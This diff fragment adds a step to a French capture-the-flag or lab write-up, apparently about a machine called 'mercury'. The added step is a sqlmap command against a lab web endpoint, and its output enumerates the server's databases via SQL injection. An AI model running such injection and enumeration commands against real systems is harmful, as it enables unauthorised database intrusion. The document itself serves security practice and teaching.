@@ -240,3 +240,11 @@ back-end DBMS: MySQL >= 5.6
 
 [*] ending @ 09:30:55 /2022-01-27/
 ```
+
+La commande ```sqlmap http://192.168.56.103:8080/mercuryfacts/1 --dbs``` me donne :
+```
+available databases [2]:
+[*] information_schema
+[*] mercury
+```
+
